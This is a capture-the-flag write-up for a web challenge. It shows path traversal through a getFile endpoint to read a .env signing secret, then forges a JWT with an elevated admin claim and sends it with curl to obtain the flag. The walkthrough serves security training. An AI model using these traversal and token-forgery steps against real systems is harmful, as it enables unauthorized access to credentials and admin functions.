# Fun with Tokens

Visiting the provided website we see some interesting thing:
There are two links:

http://3.142.122.1:9334/login
http://3.142.122.1:9334/adminNames

And comments in the Source:
```
<!-- /admin is where the fun's at XD -->
<!--The secret you seek is in the environment-->
```

Admin names sounds interesting so let's check that first:
There is actually a redirect to a getFile.php interesting.
Opening http://3.142.122.1:9334/getFile?file=admins in a browser provides us a list with admin names:

```
0xd4127c3c
din_djarin11
```

This already looks a lot like there might be LFI possible. We have the hint that there is some secret in the environment so let's try to pull the .env file using the getFile.php:

http://3.142.122.1:9334/getFile?file=.env
```
No such file or directory: /app/public/.env
```

Okay but maybe in the /app directory?

http://3.142.122.1:9334/getFile?file=../.env

```
secret=G00D_s0ld13rs_k33p_s3cret5
```
Sweet! Unfortunately this is not our flag so we have to search further. Let's have at /admin as the hint said that's where the fun is supposed to be.

http://3.142.122.1:9334/admin
```
{"success":false,"message":"Maybe send the token via Headers ... for Authorization?"}
```

This is some kind of API but we are not authorized. It seems like we need a token, we already have a secret_key which is used to sign tokens so this will propably be our attack vector.
We don't have any cookies/tokens yet so let's check our /login page.

For getting the intial token 

```curl -s -i "http://3.142.122.1:9334/login" -d "username=din_djarin11" |grep token```

![header_token](https://user-images.githubusercontent.com/73250884/120975811-495cc780-c78f-11eb-8846-a9fcd65a5263.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF2YV9xd25ldmExMSIsInBhc3N3b3JkIjoiaGFxcnN2YXJxIiwiYWRtaW4iOiJzbnlmciIsImlhdCI6MTYyMzA1MDUyNn0.HcaTRFCnecRpusoNFTupk2ZiH4tCMNwVCrI4tMn2-4Q
```
Let's decrypt it using https://jwt.io

Intiallly it is like this

![jwt.io.png](https://user-images.githubusercontent.com/73250884/120976911-680f8e00-c790-11eb-8b3e-8f58508ca57a.png)

Change the admin to gehr and use the secret code we got.

After changing we get out new token

![jwt_io.png](https://user-images.githubusercontent.com/73250884/120976121-a8bad780-c78f-11eb-919a-b37128069345.png)

```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF2YV9xd25ldmExMSIsInBhc3N3b3JkIjoiaGFxcnN2YXJxIiwiYWRtaW4iOiJnZWhyIiwiaWF0IjoxNjIzMDUwNTI2fQ.lzzivSQHWUoPxBy4VWv0CdosfDJRZDiOqjR7T36eerQ
```
Let's send that token to /admin as our authorization header:

```
curl http://3.142.122.1:9334/admin -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF2YV9xd25ldmExMSIsInBhc3N3b3JkIjoiaGFxcnN2YXJxIiwiYWRtaW4iOiJnZWhyIiwiaWF0IjoxNjIzMDUwNTI2fQ.lzzivSQHWUoPxBy4VWv0CdosfDJRZDiOqjR7T36eerQ"
Hey din_djarin11! Here's your flag: FURYY{G0x3af_q0_z4gg3e_4r91ns4506s384q460s0s0p6r9r5sr4n}
```

![image](https://user-images.githubusercontent.com/73250884/120977485-000d7780-c791-11eb-8f69-08841c575b3c.png)

```
FURYY{G0x3af_q0_z4gg3e_4r91ns4506s384q460s0s0p6r9r5sr4n}
```
By doing the rot 13 using cyberchef we get the flag https://gchq.github.io/CyberChef/

![image](https://user-images.githubusercontent.com/73250884/120977731-4a8ef400-c791-11eb-83a6-0dcb1613e7fe.png)

```
SHELL{T0k3ns_d0_m4tt3r_4e91af4506f384d460f0f0c6e9e5fe4a}
```
